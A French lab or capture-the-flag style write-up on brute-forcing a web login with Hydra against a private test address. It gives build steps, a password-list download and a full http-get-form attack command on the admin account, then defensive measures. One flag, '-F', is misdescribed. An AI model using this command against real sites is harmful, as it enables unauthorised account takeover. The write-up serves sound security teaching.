# Exploit 05 - Password bruteforcing

# Installation et utilisation de Hydra

Hydra est un outil de force brute open source conçu pour tenter de récupérer des mots de passe en effectuant des tentatives de connexion sur un serveur distant. Voici comment installer et utiliser Hydra à partir de son dépôt GitHub.

## Installation

1. **Clonez le dépôt Hydra** :
    Ouvrez un terminal et exécutez la commande suivante pour cloner le dépôt Hydra depuis GitHub :
    ```bash
    git clone https://github.com/vanhauser-thc/thc-hydra.git
    ```

2. **Accédez au dossier Hydra** :
    Changez de répertoire pour aller dans le dossier cloné :
    ```bash
    cd thc-hydra
    ```

3. **Configuration et compilation** :
    Configurez et compilez Hydra en exécutant les commandes suivantes :
    ```bash
    ./configure
    make
    ```

4. **Telechargement du dictionnaire de mots de passes** :
    ```bash
    wget https://lucidar.me/fr/security/files/100-most-common-passwords.txt
    mv 100-most-common-passwords.txt password.txt
    ```

## Utilisation

Tentez une connexion pour obtenir l'URL de connexion failed

Pour tester une connexion avec un utilisateur administrateur utilisez la commande suivante :

```bash
./hydra -l admin -P ./password.txt -F -o hydra.log 192.168.56.102 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
```

- `-l admin` spécifie l'utilisateur que nous essayons de pirater.
- `-P ./password.txt` indique le chemin vers un fichier contenant un dictionnaire de mots de passe.
- `-F` active le mode de force brute.
- `-o hydra.log` spécifie le fichier dans lequel stocker les résultats.
- `192.168.56.102` est l'adresse IP du site cible.
- `http-get-form` le type de la requete
- `/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif` est l'URL avec nos variables `USER` et `PASS` qui seront utilisées pour tester tous les mots de passe du dictionnaire.

Cette commande tente de se connecter en utilisant différents mots de passe du dictionnaire jusqu'à ce qu'elle trouve un mot de passe qui fonctionne, en affichant les résultats dans le fichier `hydra.log`.

## Protection contre ce genre de cas

Pour renforcer la sécurité des systèmes contre les attaques par force brute, plusieurs mesures importantes doivent être prises :

1. **Utilisation de mots de passe complexes**
   - Encourager les utilisateurs à créer des mots de passe longs et complexes, comprenant des lettres majuscules et minuscules, des chiffres et des caractères spéciaux.

2. **Limitation des tentatives de connexion**
   - Mettre en place des mécanismes pour limiter le nombre de tentatives de connexion infructueuses, en bloquant temporairement ou définitivement les comptes après un certain nombre d'échecs.

3. **Authentification multi-facteurs (2FA)**
   - Activer l'authentification à deux facteurs ajoute une couche supplémentaire de sécurité, rendant plus difficile pour un attaquant d'accéder au compte même s'il obtient le mot de passe.

4. **Surveillance des activités suspectes**
   - Surveiller de près les activités sur le réseau et les logs d'accès pour identifier rapidement les tentatives d'attaque par force brute.

5. **Utilisation de CAPTCHA**
   - Intégrer des tests CAPTCHA dans les formulaires de connexion pour distinguer les humains des bots automatisés.